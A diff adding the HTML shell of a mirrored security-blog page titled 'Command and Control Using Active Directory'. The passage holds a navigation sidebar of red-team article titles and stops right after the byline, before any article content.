@@ -1,0 +1,546 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Command and Control Using Active Directory | Raw2Crawl</title><meta name="description" content="Security testing documentation.">
+<link rel="canonical" href="https://raw2crawl.github.io/en/harmj0y/Powershell/command-and-control-using-active-directory/"><link rel="icon" href="/assets/icon.svg" type="image/svg+xml">
+<meta name="color-scheme" content="light dark"><meta name="theme-color" content="#202020">
+<script>try{var t=localStorage.getItem('raw2crawl-theme');document.documentElement.dataset.theme=t==='light'||t==='dark'?t:matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light'}catch(e){document.documentElement.dataset.theme=matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light'}</script>
+<link rel="stylesheet" href="/assets/site.css?v=b655f120c851"><script src="/assets/site.js?v=9a5393417b9c" defer></script>
+</head><body id="top" class="documentation blog-document">
+<a class="skip-link" href="#main-content">Skip to content</a>
+<header class="site-header"><a class="brand" href="/en/">Raw2Crawl<span class="brand-divider" aria-hidden="true">/</span><span class="brand-label">Documentation</span></a>
+<div class="header-actions"><span class="language" aria-label="Language: English">EN</span><button id="theme-toggle" type="button" aria-label="Switch color theme">Theme</button></div></header>
+<div class="mobile-toolbar"><button id="contents-toggle" type="button" aria-controls="doc-sidebar" aria-expanded="false">Contents</button><span>harmj0y / Powershell</span></div><div class="docs-layout"><aside id="doc-sidebar" class="sidebar" aria-label="Blog contents"><div class="sidebar-book"><span class="eyebrow">harmj0y</span><a href="/en/harmj0y/">Blog archive</a><span class="edition">83 articles · 10 categories</span></div><nav class="wstg-nav series-nav" aria-label="Blog categories and articles"><label for="harmjoy-filter" class="wstg-nav-filter-label">Search contents</label><input id="harmjoy-filter" type="search" class="wstg-nav-filter" placeholder="Find an article…" autocomplete="off"><div class="wstg-nav-filter-controls"><button type="button" class="wstg-nav-filter-clear" hidden>Clear</button><p class="wstg-nav-filter-count" aria-live="polite" hidden></p></div><div class="wstg-nav-controls"><button type="button" data-wstg-expand>Expand all</button><button type="button" data-wstg-collapse>Collapse all</button></div><ul class="wstg-nav-list"><li class="wstg-nav-item" data-title="All categories"><a data-nav-url="/en/harmj0y/" href="/en/harmj0y/">All categories</a></li><li class="wstg-nav-item" data-title="ActiveDirectory"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/ActiveDirectory/" href="/en/harmj0y/ActiveDirectory/">ActiveDirectory (10)</a></span></summary><ul><li class="wstg-nav-item" data-title="Certified Pre-Owned"><a data-nav-url="/en/harmj0y/ActiveDirectory/certified-pre-owned/" href="/en/harmj0y/ActiveDirectory/certified-pre-owned/">Certified Pre-Owned</a></li><li class="wstg-nav-item" data-title="A Case Study in Wagging the Dog: Computer Takeover"><a data-nav-url="/en/harmj0y/ActiveDirectory/a-case-study-in-wagging-the-dog-computer-takeover/" href="/en/harmj0y/ActiveDirectory/a-case-study-in-wagging-the-dog-computer-takeover/">A Case Study in Wagging the Dog: Computer Takeover</a></li><li class="wstg-nav-item" data-title="Remote Hash Extraction On Demand Via Host Security Descriptor Modification"><a data-nav-url="/en/harmj0y/ActiveDirectory/remote-hash-extraction-on-demand-via-host-security-descriptor-modification/" href="/en/harmj0y/ActiveDirectory/remote-hash-extraction-on-demand-via-host-security-descriptor-modification/">Remote Hash Extraction On Demand Via Host Security Descriptor Modification</a></li><li class="wstg-nav-item" data-title="A Guide to Attacking Domain Trusts"><a data-nav-url="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/" href="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a></li><li class="wstg-nav-item" data-title="Hunting With Active Directory Replication Metadata"><a data-nav-url="/en/harmj0y/ActiveDirectory/hunting-with-active-directory-replication-metadata/" href="/en/harmj0y/ActiveDirectory/hunting-with-active-directory-replication-metadata/">Hunting With Active Directory Replication Metadata</a></li><li class="wstg-nav-item" data-title="A Pentester’s Guide to Group Scoping"><a data-nav-url="/en/harmj0y/ActiveDirectory/a-pentesters-guide-to-group-scoping/" href="/en/harmj0y/ActiveDirectory/a-pentesters-guide-to-group-scoping/">A Pentester’s Guide to Group Scoping</a></li><li class="wstg-nav-item" data-title="Targeted Kerberoasting"><a data-nav-url="/en/harmj0y/ActiveDirectory/targeted-kerberoasting/" href="/en/harmj0y/ActiveDirectory/targeted-kerberoasting/">Targeted Kerberoasting</a></li><li class="wstg-nav-item" data-title="Roasting AS-REPs"><a data-nav-url="/en/harmj0y/ActiveDirectory/roasting-as-reps/" href="/en/harmj0y/ActiveDirectory/roasting-as-reps/">Roasting AS-REPs</a></li><li class="wstg-nav-item" data-title="The Most Dangerous User Right You (Probably) Have Never Heard Of"><a data-nav-url="/en/harmj0y/ActiveDirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/" href="/en/harmj0y/ActiveDirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">The Most Dangerous User Right You (Probably) Have Never Heard Of</a></li><li class="wstg-nav-item" data-title="S4U2Pwnage"><a data-nav-url="/en/harmj0y/ActiveDirectory/s4u2pwnage/" href="/en/harmj0y/ActiveDirectory/s4u2pwnage/">S4U2Pwnage</a></li></ul></details></li><li class="wstg-nav-item" data-title="Defense"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Defense/" href="/en/harmj0y/Defense/">Defense (2)</a></span></summary><ul><li class="wstg-nav-item" data-title="Hunting With Active Directory Replication Metadata"><a data-nav-url="/en/harmj0y/ActiveDirectory/hunting-with-active-directory-replication-metadata/" href="/en/harmj0y/ActiveDirectory/hunting-with-active-directory-replication-metadata/">Hunting With Active Directory Replication Metadata</a></li><li class="wstg-nav-item" data-title="PowerSCCM"><a data-nav-url="/en/harmj0y/Defense/powersccm/" href="/en/harmj0y/Defense/powersccm/">PowerSCCM</a></li></ul></details></li><li class="wstg-nav-item" data-title="Empire"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Empire/" href="/en/harmj0y/Empire/">Empire (11)</a></span></summary><ul><li class="wstg-nav-item" data-title="Empire Fails"><a data-nav-url="/en/harmj0y/Empire/empire-fails/" href="/en/harmj0y/Empire/empire-fails/">Empire Fails</a></li><li class="wstg-nav-item" data-title="The Empire Strikes Back"><a data-nav-url="/en/harmj0y/Empire/the-empire-strikes-back/" href="/en/harmj0y/Empire/the-empire-strikes-back/">The Empire Strikes Back</a></li><li class="wstg-nav-item" data-title="Empire’s RESTful API"><a data-nav-url="/en/harmj0y/Empire/empires-restful-api/" href="/en/harmj0y/Empire/empires-restful-api/">Empire’s RESTful API</a></li><li class="wstg-nav-item" data-title="Empire 1.5"><a data-nav-url="/en/harmj0y/Empire/empire-1-5/" href="/en/harmj0y/Empire/empire-1-5/">Empire 1.5</a></li><li class="wstg-nav-item" data-title="Empire’s CLI"><a data-nav-url="/en/harmj0y/Empire/empires-cli/" href="/en/harmj0y/Empire/empires-cli/">Empire’s CLI</a></li><li class="wstg-nav-item" data-title="Nothing Lasts Forever: Persistence with Empire"><a data-nav-url="/en/harmj0y/Empire/nothing-lasts-forever-persistence-with-empire/" href="/en/harmj0y/Empire/nothing-lasts-forever-persistence-with-empire/">Nothing Lasts Forever: Persistence with Empire</a></li><li class="wstg-nav-item" data-title="Expanding Your Empire"><a data-nav-url="/en/harmj0y/Empire/expanding-your-empire/" href="/en/harmj0y/Empire/expanding-your-empire/">Expanding Your Empire</a></li><li class="wstg-nav-item" data-title="Empire 1.4"><a data-nav-url="/en/harmj0y/Empire/empire-1-4/" href="/en/harmj0y/Empire/empire-1-4/">Empire 1.4</a></li><li class="wstg-nav-item" data-title="Empire 1.3"><a data-nav-url="/en/harmj0y/Empire/empire-1-3/" href="/en/harmj0y/Empire/empire-1-3/">Empire 1.3</a></li><li class="wstg-nav-item" data-title="Empire 1.2"><a data-nav-url="/en/harmj0y/Empire/empire-1-2/" href="/en/harmj0y/Empire/empire-1-2/">Empire 1.2</a></li><li class="wstg-nav-item" data-title="Empire 1.1"><a data-nav-url="/en/harmj0y/Empire/empire-1-1/" href="/en/harmj0y/Empire/empire-1-1/">Empire 1.1</a></li></ul></details></li><li class="wstg-nav-item" data-title="EmPyre"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/EmPyre/" href="/en/harmj0y/EmPyre/">EmPyre (2)</a></span></summary><ul><li class="wstg-nav-item" data-title="OS X Office Macros with EmPyre"><a data-nav-url="/en/harmj0y/EmPyre/os-x-office-macros-with-empyre/" href="/en/harmj0y/EmPyre/os-x-office-macros-with-empyre/">OS X Office Macros with EmPyre</a></li><li class="wstg-nav-item" data-title="Building an EmPyre with Python"><a data-nav-url="/en/harmj0y/EmPyre/building-an-empyre-with-python/" href="/en/harmj0y/EmPyre/building-an-empyre-with-python/">Building an EmPyre with Python</a></li></ul></details></li><li class="wstg-nav-item" data-title="Informational"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Informational/" href="/en/harmj0y/Informational/">Informational (3)</a></span></summary><ul><li class="wstg-nav-item" data-title="A Three Year Retrospective"><a data-nav-url="/en/harmj0y/Informational/a-three-year-retrospective/" href="/en/harmj0y/Informational/a-three-year-retrospective/">A Three Year Retrospective</a></li><li class="wstg-nav-item" data-title="Empire, Meterpreter, and Offensive Half-life"><a data-nav-url="/en/harmj0y/Informational/empire-meterpreter-and-offensive-half-life/" href="/en/harmj0y/Informational/empire-meterpreter-and-offensive-half-life/">Empire, Meterpreter, and Offensive Half-life</a></li><li class="wstg-nav-item" data-title="Cracking the Perimeter (CTP) and OSCE review"><a data-nav-url="/en/harmj0y/Informational/cracking-the-perimeter-ctp-and-osce-review/" href="/en/harmj0y/Informational/cracking-the-perimeter-ctp-and-osce-review/">Cracking the Perimeter (CTP) and OSCE review</a></li></ul></details></li><li class="wstg-nav-item" data-title="Penetesting"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Penetesting/" href="/en/harmj0y/Penetesting/">Penetesting (7)</a></span></summary><ul><li class="wstg-nav-item" data-title="Push it, Push it Real Good"><a data-nav-url="/en/harmj0y/Red-Teaming/push-it-push-it-real-good/" href="/en/harmj0y/Red-Teaming/push-it-push-it-real-good/">Push it, Push it Real Good</a></li><li class="wstg-nav-item" data-title="“I Hunt Sys Admins”"><a data-nav-url="/en/harmj0y/Penetesting/i-hunt-sysadmins/" href="/en/harmj0y/Penetesting/i-hunt-sysadmins/">“I Hunt Sys Admins”</a></li><li class="wstg-nav-item" data-title="Mining a Domain’s Worth of Data With PowerShell"><a data-nav-url="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/" href="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/">Mining a Domain’s Worth of Data With PowerShell</a></li><li class="wstg-nav-item" data-title="Dumping a Domain’s Worth of Passwords With Mimikatz pt. 2"><a data-nav-url="/en/harmj0y/Powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/" href="/en/harmj0y/Powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/">Dumping a Domain’s Worth of Passwords With Mimikatz pt. 2</a></li><li class="wstg-nav-item" data-title="The Case of a Stubborn ntds.dit"><a data-nav-url="/en/harmj0y/Red-Teaming/the-case-of-a-stubborn-ntds-dit/" href="/en/harmj0y/Red-Teaming/the-case-of-a-stubborn-ntds-dit/">The Case of a Stubborn ntds.dit</a></li><li class="wstg-nav-item" data-title="Finding Local Admin with the Veil-Framework"><a data-nav-url="/en/harmj0y/Penetesting/finding-local-admin-with-the-veil-framework/" href="/en/harmj0y/Penetesting/finding-local-admin-with-the-veil-framework/">Finding Local Admin with the Veil-Framework</a></li><li class="wstg-nav-item" data-title="Pass-the-Hash is Dead: Long Live Pass-the-Hash"><a data-nav-url="/en/harmj0y/Penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/" href="/en/harmj0y/Penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/">Pass-the-Hash is Dead: Long Live Pass-the-Hash</a></li></ul></details></li><li class="wstg-nav-item" data-title="Powershell"><details open><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Powershell/" href="/en/harmj0y/Powershell/">Powershell (22)</a></span></summary><ul><li class="wstg-nav-item" data-title="The PowerView PowerUsage Series #5"><a data-nav-url="/en/harmj0y/Powershell/the-powerview-powerusage-series-5/" href="/en/harmj0y/Powershell/the-powerview-powerusage-series-5/">The PowerView PowerUsage Series #5</a></li><li class="wstg-nav-item" data-title="The PowerView PowerUsage Series #4"><a data-nav-url="/en/harmj0y/Powershell/the-powerview-powerusage-series-4/" href="/en/harmj0y/Powershell/the-powerview-powerusage-series-4/">The PowerView PowerUsage Series #4</a></li><li class="wstg-nav-item" data-title="The PowerView PowerUsage Series #3"><a data-nav-url="/en/harmj0y/Powershell/the-powerview-powerusage-series-3/" href="/en/harmj0y/Powershell/the-powerview-powerusage-series-3/">The PowerView PowerUsage Series #3</a></li><li class="wstg-nav-item" data-title="The PowerView PowerUsage Series #2"><a data-nav-url="/en/harmj0y/Powershell/the-powerview-powerusage-series-2/" href="/en/harmj0y/Powershell/the-powerview-powerusage-series-2/">The PowerView PowerUsage Series #2</a></li><li class="wstg-nav-item" data-title="The PowerView PowerUsage Series #1"><a data-nav-url="/en/harmj0y/Powershell/the-powerview-powerusage-series-1/" href="/en/harmj0y/Powershell/the-powerview-powerusage-series-1/">The PowerView PowerUsage Series #1</a></li><li class="wstg-nav-item" data-title="Make PowerView Great Again"><a data-nav-url="/en/harmj0y/Powershell/make-powerview-great-again/" href="/en/harmj0y/Powershell/make-powerview-great-again/">Make PowerView Great Again</a></li><li class="wstg-nav-item" data-title="Kerberoasting Without Mimikatz"><a data-nav-url="/en/harmj0y/Powershell/kerberoasting-without-mimikatz/" href="/en/harmj0y/Powershell/kerberoasting-without-mimikatz/">Kerberoasting Without Mimikatz</a></li><li class="wstg-nav-item" data-title="Command and Control Using Active Directory"><a data-nav-url="/en/harmj0y/Powershell/command-and-control-using-active-directory/" href="/en/harmj0y/Powershell/command-and-control-using-active-directory/" aria-current="page">Command and Control Using Active Directory</a></li><li class="wstg-nav-item" data-title="PowerShell RC4"><a data-nav-url="/en/harmj0y/Powershell/powershell-rc4/" href="/en/harmj0y/Powershell/powershell-rc4/">PowerShell RC4</a></li><li class="wstg-nav-item" data-title="Upgrading PowerUp With PSReflect"><a data-nav-url="/en/harmj0y/Powershell/upgrading-powerup-with-psreflect/" href="/en/harmj0y/Powershell/upgrading-powerup-with-psreflect/">Upgrading PowerUp With PSReflect</a></li><li class="wstg-nav-item" data-title="Running LAPS with PowerView"><a data-nav-url="/en/harmj0y/Powershell/running-laps-with-powerview/" href="/en/harmj0y/Powershell/running-laps-with-powerview/">Running LAPS with PowerView</a></li><li class="wstg-nav-item" data-title="GPP and PowerView"><a data-nav-url="/en/harmj0y/Powershell/gpp-and-powerview/" href="/en/harmj0y/Powershell/gpp-and-powerview/">GPP and PowerView</a></li><li class="wstg-nav-item" data-title="Invoke-BypassUAC"><a data-nav-url="/en/harmj0y/Powershell/invoke-bypassuac/" href="/en/harmj0y/Powershell/invoke-bypassuac/">Invoke-BypassUAC</a></li><li class="wstg-nav-item" data-title="PowerQuinsta"><a data-nav-url="/en/harmj0y/Powershell/powerquinsta/" href="/en/harmj0y/Powershell/powerquinsta/">PowerQuinsta</a></li><li class="wstg-nav-item" data-title="Mining a Domain’s Worth of Data With PowerShell"><a data-nav-url="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/" href="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/">Mining a Domain’s Worth of Data With PowerShell</a></li><li class="wstg-nav-item" data-title="Dumping a Domain’s Worth of Passwords With Mimikatz pt. 2"><a data-nav-url="/en/harmj0y/Powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/" href="/en/harmj0y/Powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/">Dumping a Domain’s Worth of Passwords With Mimikatz pt. 2</a></li><li class="wstg-nav-item" data-title="PowerShell and Win32 API Access"><a data-nav-url="/en/harmj0y/Powershell/powershell-and-win32-api-access/" href="/en/harmj0y/Powershell/powershell-and-win32-api-access/">PowerShell and Win32 API Access</a></li><li class="wstg-nav-item" data-title="Derbycon + PowerShell Weaponization"><a data-nav-url="/en/harmj0y/Powershell/derbycon-powershell-weaponization/" href="/en/harmj0y/Powershell/derbycon-powershell-weaponization/">Derbycon + PowerShell Weaponization</a></li><li class="wstg-nav-item" data-title="Veil-PowerView: A Usage Guide"><a data-nav-url="/en/harmj0y/Powershell/veil-powerview-a-usage-guide/" href="/en/harmj0y/Powershell/veil-powerview-a-usage-guide/">Veil-PowerView: A Usage Guide</a></li><li class="wstg-nav-item" data-title="PowerUp: A Usage Guide"><a data-nav-url="/en/harmj0y/Powershell/powerup-a-usage-guide/" href="/en/harmj0y/Powershell/powerup-a-usage-guide/">PowerUp: A Usage Guide</a></li><li class="wstg-nav-item" data-title="PowerUp v1.1 – Beyond Service Abuse"><a data-nav-url="/en/harmj0y/Powershell/powerup-v1-1-beyond-service-abuse/" href="/en/harmj0y/Powershell/powerup-v1-1-beyond-service-abuse/">PowerUp v1.1 – Beyond Service Abuse</a></li><li class="wstg-nav-item" data-title="PowerUp"><a data-nav-url="/en/harmj0y/Powershell/powerup/" href="/en/harmj0y/Powershell/powerup/">PowerUp</a></li></ul></details></li><li class="wstg-nav-item" data-title="Python"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Python/" href="/en/harmj0y/Python/">Python (1)</a></span></summary><ul><li class="wstg-nav-item" data-title="Pwnstaller 1.0"><a data-nav-url="/en/harmj0y/Python/pwnstaller-1-0/" href="/en/harmj0y/Python/pwnstaller-1-0/">Pwnstaller 1.0</a></li></ul></details></li><li class="wstg-nav-item" data-title="Red Teaming"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Red-Teaming/" href="/en/harmj0y/Red-Teaming/">Red Teaming (35)</a></span></summary><ul><li class="wstg-nav-item" data-title="Kerberoasting Revisited"><a data-nav-url="/en/harmj0y/Red-Teaming/kerberoasting-revisited/" href="/en/harmj0y/Red-Teaming/kerberoasting-revisited/">Kerberoasting Revisited</a></li><li class="wstg-nav-item" data-title="Not A Security Boundary: Breaking Forest Trusts"><a data-nav-url="/en/harmj0y/Red-Teaming/not-a-security-boundary-breaking-forest-trusts/" href="/en/harmj0y/Red-Teaming/not-a-security-boundary-breaking-forest-trusts/">Not A Security Boundary: Breaking Forest Trusts</a></li><li class="wstg-nav-item" data-title="Another Word on Delegation"><a data-nav-url="/en/harmj0y/Red-Teaming/another-word-on-delegation/" href="/en/harmj0y/Red-Teaming/another-word-on-delegation/">Another Word on Delegation</a></li><li class="wstg-nav-item" data-title="Rubeus – Now With More Kekeo"><a data-nav-url="/en/harmj0y/Red-Teaming/rubeus-now-with-more-kekeo/" href="/en/harmj0y/Red-Teaming/rubeus-now-with-more-kekeo/">Rubeus – Now With More Kekeo</a></li><li class="wstg-nav-item" data-title="From Kekeo to Rubeus"><a data-nav-url="/en/harmj0y/Red-Teaming/from-kekeo-to-rubeus/" href="/en/harmj0y/Red-Teaming/from-kekeo-to-rubeus/">From Kekeo to Rubeus</a></li><li class="wstg-nav-item" data-title="Operational Guidance for Offensive User DPAPI Abuse"><a data-nav-url="/en/harmj0y/Red-Teaming/operational-guidance-for-offensive-user-dpapi-abuse/" href="/en/harmj0y/Red-Teaming/operational-guidance-for-offensive-user-dpapi-abuse/">Operational Guidance for Offensive User DPAPI Abuse</a></li><li class="wstg-nav-item" data-title="GhostPack"><a data-nav-url="/en/harmj0y/Red-Teaming/ghostpack/" href="/en/harmj0y/Red-Teaming/ghostpack/">GhostPack</a></li><li class="wstg-nav-item" data-title="A Guide to Attacking Domain Trusts"><a data-nav-url="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/" href="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a></li><li class="wstg-nav-item" data-title="Offensive Encrypted Data Storage (DPAPI edition)"><a data-nav-url="/en/harmj0y/Red-Teaming/offensive-encrypted-data-storage-dpapi-edition/" href="/en/harmj0y/Red-Teaming/offensive-encrypted-data-storage-dpapi-edition/">Offensive Encrypted Data Storage (DPAPI edition)</a></li><li class="wstg-nav-item" data-title="Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy"><a data-nav-url="/en/harmj0y/Red-Teaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" href="/en/harmj0y/Red-Teaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a></li><li class="wstg-nav-item" data-title="Offensive Encrypted Data Storage"><a data-nav-url="/en/harmj0y/Red-Teaming/offensive-encrypted-data-storage/" href="/en/harmj0y/Red-Teaming/offensive-encrypted-data-storage/">Offensive Encrypted Data Storage</a></li><li class="wstg-nav-item" data-title="Command and Control Using Active Directory"><a data-nav-url="/en/harmj0y/Powershell/command-and-control-using-active-directory/" href="/en/harmj0y/Powershell/command-and-control-using-active-directory/">Command and Control Using Active Directory</a></li><li class="wstg-nav-item" data-title="KeeThief – A Case Study in Attacking KeePass Part 2"><a data-nav-url="/en/harmj0y/Red-Teaming/keethief-a-case-study-in-attacking-keepass-part-2/" href="/en/harmj0y/Red-Teaming/keethief-a-case-study-in-attacking-keepass-part-2/">KeeThief – A Case Study in Attacking KeePass Part 2</a></li><li class="wstg-nav-item" data-title="A Case Study in Attacking KeePass"><a data-nav-url="/en/harmj0y/Red-Teaming/a-case-study-in-attacking-keepass/" href="/en/harmj0y/Red-Teaming/a-case-study-in-attacking-keepass/">A Case Study in Attacking KeePass</a></li><li class="wstg-nav-item" data-title="Where My Admins At? (GPO Edition)"><a data-nav-url="/en/harmj0y/Red-Teaming/where-my-admins-at-gpo-edition/" href="/en/harmj0y/Red-Teaming/where-my-admins-at-gpo-edition/">Where My Admins At? (GPO Edition)</a></li><li class="wstg-nav-item" data-title="Running LAPS with PowerView"><a data-nav-url="/en/harmj0y/Powershell/running-laps-with-powerview/" href="/en/harmj0y/Powershell/running-laps-with-powerview/">Running LAPS with PowerView</a></li><li class="wstg-nav-item" data-title="Abusing GPO Permissions"><a data-nav-url="/en/harmj0y/Red-Teaming/abusing-gpo-permissions/" href="/en/harmj0y/Red-Teaming/abusing-gpo-permissions/">Abusing GPO Permissions</a></li><li class="wstg-nav-item" data-title="Local Group Enumeration"><a data-nav-url="/en/harmj0y/Red-Teaming/local-group-enumeration/" href="/en/harmj0y/Red-Teaming/local-group-enumeration/">Local Group Enumeration</a></li><li class="wstg-nav-item" data-title="Targeted Plaintext Downgrades with PowerView"><a data-nav-url="/en/harmj0y/Red-Teaming/targeted-plaintext-downgrades-with-powerview/" href="/en/harmj0y/Red-Teaming/targeted-plaintext-downgrades-with-powerview/">Targeted Plaintext Downgrades with PowerView</a></li><li class="wstg-nav-item" data-title="Sheets on Sheets on Sheets"><a data-nav-url="/en/harmj0y/Red-Teaming/sheets-on-sheets-on-sheets/" href="/en/harmj0y/Red-Teaming/sheets-on-sheets-on-sheets/">Sheets on Sheets on Sheets</a></li><li class="wstg-nav-item" data-title="Abusing Active Directory Permissions with PowerView"><a data-nav-url="/en/harmj0y/Red-Teaming/abusing-active-directory-permissions-with-powerview/" href="/en/harmj0y/Red-Teaming/abusing-active-directory-permissions-with-powerview/">Abusing Active Directory Permissions with PowerView</a></li><li class="wstg-nav-item" data-title="PowerView 2.0"><a data-nav-url="/en/harmj0y/Red-Teaming/powerview-2-0/" href="/en/harmj0y/Red-Teaming/powerview-2-0/">PowerView 2.0</a></li><li class="wstg-nav-item" data-title="Mimikatz and DCSync and ExtraSids, Oh My"><a data-nav-url="/en/harmj0y/Red-Teaming/mimikatz-and-dcsync-and-extrasids-oh-my/" href="/en/harmj0y/Red-Teaming/mimikatz-and-dcsync-and-extrasids-oh-my/">Mimikatz and DCSync and ExtraSids, Oh My</a></li><li class="wstg-nav-item" data-title="The Trustpocalypse"><a data-nav-url="/en/harmj0y/Red-Teaming/the-trustpocalypse/" href="/en/harmj0y/Red-Teaming/the-trustpocalypse/">The Trustpocalypse</a></li><li class="wstg-nav-item" data-title="Domain Trusts: We’re Not Done Yet"><a data-nav-url="/en/harmj0y/Red-Teaming/domain-trusts-were-not-done-yet/" href="/en/harmj0y/Red-Teaming/domain-trusts-were-not-done-yet/">Domain Trusts: We’re Not Done Yet</a></li><li class="wstg-nav-item" data-title="Identifying Your Prey"><a data-nav-url="/en/harmj0y/Red-Teaming/identifying-your-prey/" href="/en/harmj0y/Red-Teaming/identifying-your-prey/">Identifying Your Prey</a></li><li class="wstg-nav-item" data-title="Push it, Push it Real Good"><a data-nav-url="/en/harmj0y/Red-Teaming/push-it-push-it-real-good/" href="/en/harmj0y/Red-Teaming/push-it-push-it-real-good/">Push it, Push it Real Good</a></li><li class="wstg-nav-item" data-title="Domain Trusts: Why You Should Care"><a data-nav-url="/en/harmj0y/Red-Teaming/domain-trusts-why-you-should-care/" href="/en/harmj0y/Red-Teaming/domain-trusts-why-you-should-care/">Domain Trusts: Why You Should Care</a></li><li class="wstg-nav-item" data-title="Mining a Domain’s Worth of Data With PowerShell"><a data-nav-url="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/" href="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/">Mining a Domain’s Worth of Data With PowerShell</a></li><li class="wstg-nav-item" data-title="Targeted Trojanation"><a data-nav-url="/en/harmj0y/Red-Teaming/targeted-trojanation/" href="/en/harmj0y/Red-Teaming/targeted-trojanation/">Targeted Trojanation</a></li><li class="wstg-nav-item" data-title="The Case of a Stubborn ntds.dit"><a data-nav-url="/en/harmj0y/Red-Teaming/the-case-of-a-stubborn-ntds-dit/" href="/en/harmj0y/Red-Teaming/the-case-of-a-stubborn-ntds-dit/">The Case of a Stubborn ntds.dit</a></li><li class="wstg-nav-item" data-title="Trusts You Might Have Missed"><a data-nav-url="/en/harmj0y/Red-Teaming/trusts-you-might-have-missed/" href="/en/harmj0y/Red-Teaming/trusts-you-might-have-missed/">Trusts You Might Have Missed</a></li><li class="wstg-nav-item" data-title="A Brave New World: Malleable C2"><a data-nav-url="/en/harmj0y/Red-Teaming/a-brave-new-world-malleable-c2/" href="/en/harmj0y/Red-Teaming/a-brave-new-world-malleable-c2/">A Brave New World: Malleable C2</a></li><li class="wstg-nav-item" data-title="Veil-PowerView: A Usage Guide"><a data-nav-url="/en/harmj0y/Powershell/veil-powerview-a-usage-guide/" href="/en/harmj0y/Powershell/veil-powerview-a-usage-guide/">Veil-PowerView: A Usage Guide</a></li><li class="wstg-nav-item" data-title="File Server Triage on Red Team Engagements"><a data-nav-url="/en/harmj0y/Red-Teaming/file-server-triage-on-red-team-engagements/" href="/en/harmj0y/Red-Teaming/file-server-triage-on-red-team-engagements/">File Server Triage on Red Team Engagements</a></li></ul></details></li><li class="wstg-nav-item" data-title="Top Posts"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Top-Posts/" href="/en/harmj0y/Top-Posts/">Top Posts (5)</a></span></summary><ul><li class="wstg-nav-item" data-title="Certified Pre-Owned"><a data-nav-url="/en/harmj0y/ActiveDirectory/certified-pre-owned/" href="/en/harmj0y/ActiveDirectory/certified-pre-owned/">Certified Pre-Owned</a></li><li class="wstg-nav-item" data-title="Not A Security Boundary: Breaking Forest Trusts"><a data-nav-url="/en/harmj0y/Red-Teaming/not-a-security-boundary-breaking-forest-trusts/" href="/en/harmj0y/Red-Teaming/not-a-security-boundary-breaking-forest-trusts/">Not A Security Boundary: Breaking Forest Trusts</a></li><li class="wstg-nav-item" data-title="Operational Guidance for Offensive User DPAPI Abuse"><a data-nav-url="/en/harmj0y/Red-Teaming/operational-guidance-for-offensive-user-dpapi-abuse/" href="/en/harmj0y/Red-Teaming/operational-guidance-for-offensive-user-dpapi-abuse/">Operational Guidance for Offensive User DPAPI Abuse</a></li><li class="wstg-nav-item" data-title="A Guide to Attacking Domain Trusts"><a data-nav-url="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/" href="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a></li><li class="wstg-nav-item" data-title="Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy"><a data-nav-url="/en/harmj0y/Red-Teaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" href="/en/harmj0y/Red-Teaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a></li></ul></details></li></ul></nav></aside><main id="main-content" class="reading-pane"><nav class="breadcrumbs" aria-label="Breadcrumb"><a href="/en/">Library</a><span>/</span><a href="/en/harmj0y/">harmj0y</a><span>/</span><a href="/en/harmj0y/Powershell/">Powershell</a></nav><article class="doc-content"><h1 id="article-title">Command and Control Using Active Directory</h1><p class="article-meta">harmj0y 